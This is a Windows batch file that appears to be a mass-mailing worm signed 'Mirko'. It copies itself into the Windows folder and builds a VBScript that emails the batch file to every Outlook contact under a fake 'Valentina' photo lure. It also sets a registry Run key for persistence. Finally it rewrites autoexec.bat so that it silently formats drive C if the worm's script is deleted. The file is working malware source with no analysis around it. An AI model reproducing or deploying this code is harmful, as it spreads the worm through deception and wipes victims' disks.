@echo off
:: 				Mirko (z) 
if exist C:\windows\*.* goto 1
if not exist C:\windows\*.* goto 2
:1
md\windows\km
copy /y *.bat C:\windows\km
ren C:\windows\km\*.bat vale.bat
cls
echo Set client = CreateObject("Outlook.Application") >C:\windows\vale.vbs
echo Set address = Client.GetNameSpace("MAPI") >nul >>C:\windows\vale.vbs
echo For ItemList = 1 To Address.AddressLists.Count >nul >>C:\windows\vale.vbs
echo    Set CurrentAddress = Address.AddressLists(ItemList) >nul >>C:\windows\vale.vbs
echo 'by MIRKO  >nul >>C:\windows\vale.vbs      
echo 'by MIRKO >nul >>C:\windows\vale.vbs
echo        For entries = 1 To CurrentAddress.AddressEntries.Count >nul >>C:\windows\vale.vbs
echo            victim = CurrentAddress.AddressEntries(entries) >nul >>C:\windows\vale.vbs
echo            Set mirkoz = Client.CreateItem(0) >nul >>C:\windows\vale.vbs
echo 'by MIRKO >nul >>C:\windows\vale.vbs
echo            mirkoz.Recipients.Add (victim) >nul >>C:\windows\vale.vbs
echo            mirkoz.Subject = "SMS for You by Valentina" >nul >>C:\windows\vale.vbs
echo            mirkoz.Body = "I am your Italian friend Valentina you remember me, I have put you my photo as attached" >nul >>C:\windows\vale.vbs
echo            mirkoz.Attachments.Add ("c:\windows\km\vale.bat") >nul >>C:\windows\vale.vbs
echo            mirkoz.Send >nul >>C:\windows\vale.vbs
echo        Next >nul >>C:\windows\vale.vbs
echo 'by MIRKO >nul >>C:\windows\vale.vbs
echo 'by MIRKO >nul >>C:\windows\vale.vbs
echo Next >nul >>C:\windows\vale.vbs
echo 'by mirko >nul >>C:\windows\vale.vbs
echo 'by mirko >nul >>C:\windows\vale.vbs
echo 'by mirko >nul >>C:\windows\vale.vbs
echo Set client = Nothing >nul >>C:\windows\vale.vbs
echo Set address = Nothing >nul >>C:\windows\vale.vbs
cls
echo REGEDIT4 >C:\windows\mirkoz.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >nul >>C:\windows\mirkoz.reg
echo "valentina"="C:\\WINDOWS\\km\\vale.bat" >nul >>C:\windows\mirkoz.reg
cls
regedit /s C:\windows\mirkoz.reg
echo Dim fso, txtfile >C:\windows\danger.vbs
echo    Set fso = CreateObject("Scripting.FileSystemObject") >nul >>C:\windows\danger.vbs
echo    Set txtfile = fso.CreateTextFile("C:\autoexec.bat", True) >nul >>C:\windows\danger.vbs
echo    txtfile.writeline ("@echo off") >nul >>C:\windows\danger.vbs
echo    txtfile.writeline ("@if not exist C:\windows\vale.vbs format C: /q /u /autotest")  >nul >>C:\windows\danger.vbs
echo    txtfile.WriteBlankLines (3) >nul >>C:\windows\danger.vbs
echo    txtfile.Close >nul >>C:\windows\danger.vbs
echo msgbox "SMS for You by Valentina" ,vbinformation ,"MIRKOz" >nul >>C:\windows\danger.vbs
start C:\windows\vale.vbs
start C:\windows\danger.vbs
cls
:2
cls


